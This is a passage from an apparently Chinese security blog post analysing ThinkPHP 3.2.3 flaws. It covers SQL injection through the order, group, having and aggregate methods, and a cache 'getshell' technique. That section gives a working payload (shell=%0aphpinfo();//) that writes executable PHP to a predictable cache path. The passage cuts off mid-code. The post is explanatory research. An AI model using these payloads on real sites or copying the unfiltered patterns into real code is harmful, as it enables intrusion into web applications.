</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>),<span class="variable">$this</span>-&gt;methods,<span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="comment">// 连贯操作的实现</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>)] =   <span class="variable">$args</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201536130.png"></p>
<p><code>$args[0]</code>没有经过任何过滤就被传入到<code>$this-&gt;options[&#39;order&#39;]</code>中,而同样在<code>parseOrder</code>中没有经过任何过滤就拼接到sql语句中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params"><span class="variable">$order</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$order</span>)) &#123;</span><br><span class="line">        <span class="variable">$array</span>   =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$order</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="variable">$array</span>[] =  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$array</span>[] =  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$order</span>   =  <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$array</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$order</span>)?  <span class="string">&#x27; ORDER BY &#x27;</span>.<span class="variable">$order</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来的利用方法就跟前面提到的<code>find()</code>注入差不多</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201538087.png"></p>
<h3 id="group注入"><a href="#group注入" class="headerlink" title="group注入"></a>group注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">        <span class="variable">$group</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.group&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">group</span>(<span class="variable">$group</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseGroup</span>(<span class="params"><span class="variable">$group</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$group</span>)? <span class="string">&#x27; GROUP BY &#x27;</span>.<span class="variable">$group</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用方法同上</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211302496.png"></p>
<h3 id="having注入"><a href="#having注入" class="headerlink" title="having注入"></a>having注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">        <span class="variable">$having</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.having&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">having</span>(<span class="variable">$having</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseHaving</span>(<span class="params"><span class="variable">$having</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>  !<span class="keyword">empty</span>(<span class="variable">$having</span>)?   <span class="string">&#x27; HAVING &#x27;</span>.<span class="variable">$having</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用方法同上</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211333888.png"></p>
<h3 id="count-sum-min-max-avg注入"><a href="#count-sum-min-max-avg注入" class="headerlink" title="count sum min max avg注入"></a>count sum min max avg注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">        <span class="variable">$count</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.count&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="variable">$count</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 聚合查询</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $aggregate    聚合方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $field        字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool   $force        强制转为数字类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aggregate</span>(<span class="params"><span class="variable">$aggregate</span>, <span class="variable">$field</span>, <span class="variable">$force</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\w\.\*]+$/&#x27;</span>, <span class="variable">$field</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;not support data:&#x27;</span> . <span class="variable">$field</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">value</span>(<span class="variable">$aggregate</span> . <span class="string">&#x27;(&#x27;</span> . <span class="variable">$field</span> . <span class="string">&#x27;) AS tp_&#x27;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$aggregate</span>), <span class="number">0</span>, <span class="variable">$force</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * COUNT查询</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $field 字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> integer|string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"><span class="variable">$field</span> = <span class="string">&#x27;*&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;group&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\w\.\*]+$/&#x27;</span>, <span class="variable">$field</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;not support data:&#x27;</span> . <span class="variable">$field</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 支持GROUP</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getOptions</span>();</span><br><span class="line">        <span class="variable">$subSql</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">options</span>(<span class="variable">$options</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;count(&#x27;</span> . <span class="variable">$field</span> . <span class="string">&#x27;)&#x27;</span>)-&gt;<span class="title function_ invoke__">bind</span>(<span class="variable">$this</span>-&gt;bind)-&gt;<span class="title function_ invoke__">buildSql</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$count</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">table</span>([<span class="variable">$subSql</span> =&gt; <span class="string">&#x27;_group_count_&#x27;</span>])-&gt;<span class="title function_ invoke__">value</span>(<span class="string">&#x27;COUNT(*) AS tp_count&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">aggregate</span>(<span class="string">&#x27;COUNT&#x27;</span>, <span class="variable">$field</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_string</span>(<span class="variable">$count</span>) ? <span class="variable">$count</span> : (<span class="keyword">int</span>) <span class="variable">$count</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SUM查询</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $field 字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> float|int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$field</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">aggregate</span>(<span class="string">&#x27;SUM&#x27;</span>, <span class="variable">$field</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MIN查询</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $field 字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool   $force   强制转为数字类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">min</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$force</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">aggregate</span>(<span class="string">&#x27;MIN&#x27;</span>, <span class="variable">$field</span>, <span class="variable">$force</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MAX查询</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $field 字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool   $force   强制转为数字类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">max</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$force</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">aggregate</span>(<span class="string">&#x27;MAX&#x27;</span>, <span class="variable">$field</span>, <span class="variable">$force</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * AVG查询</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $field 字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> float|int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">avg</span>(<span class="params"><span class="variable">$field</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">aggregate</span>(<span class="string">&#x27;AVG&#x27;</span>, <span class="variable">$field</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有经过过滤就拼接到sql语句中</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211358033.png"></p>
<blockquote>
<p>除此之外还有不少sql注入同样是由于开发者错误的将用户传入的参数传递给thinkphp</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2630">水文-Thinkphp3.2.3安全开发须知</a></p>
<h2 id="缓存getshell"><a href="#缓存getshell" class="headerlink" title="缓存getshell"></a>缓存getshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.shell&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">S</span>(<span class="string">&#x27;shell&#x27;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ThinkPHP/Common/functions.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">S</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$options</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$cache</span>   =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    ...</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="keyword">empty</span>(<span class="variable">$cache</span>)) &#123; <span class="comment">// 自动初始化</span></span><br><span class="line">        <span class="variable">$cache</span>      =   <span class="title class_">Think\Cache</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// 缓存数据</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span>     =   <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;expire&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;expire&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$expire</span>     =   <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$options</span>)?<span class="variable">$options</span>:<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>);<span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#ThinkPHP/Library/Think/Cache/Driver/File.class.php</span></span><br><span class="line"><span class="comment">//class File extends Cache</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>,<span class="variable">$expire</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$filename</span>   =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filename</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$data</span>   =   <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">C</span>(<span class="string">&#x27;DATA_CACHE_COMPRESS&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        <span class="variable">$data</span>   =   <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>,<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span>    = <span class="string">&quot;&lt;?php\n//&quot;</span>.<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>,<span class="variable">$expire</span>).<span class="variable">$check</span>.<span class="variable">$data</span>.<span class="string">&quot;\n?&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>  =   <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filename</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$name</span>	=	<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;DATA_CACHE_KEY&#x27;</span>).<span class="variable">$name</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>	=	<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>].<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;temp&#x27;</span>].<span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201611252.png"></p>
<p>文件名是<code>$name</code>的md5</p>
<p>写入的数据经过了序列化</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201612696.png"></p>
<p>最终文件路径为<code>./Application/Runtime/Temp/2591c98b70119fe624898b1e424b5e91.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000s:4:&quot;asdf&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201618008.png"></p>
<p>传入<code>shell=%0aphpinfo();//</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000s:13:&quot;</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201621681.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201621121.png"></p>
<h2 id="特殊情况下造成命令执行"><a href="#特殊情况下造成命令执行" class="headerlink" title="特殊情况下造成命令执行"></a>特殊情况下造成命令执行</h2><ol>
<li><code>$this-&gt;show</code>和<code>$this-&gt;display</code></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.info&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.info&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);<span class="comment">#没有对&lt;和&gt;进行转义</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span 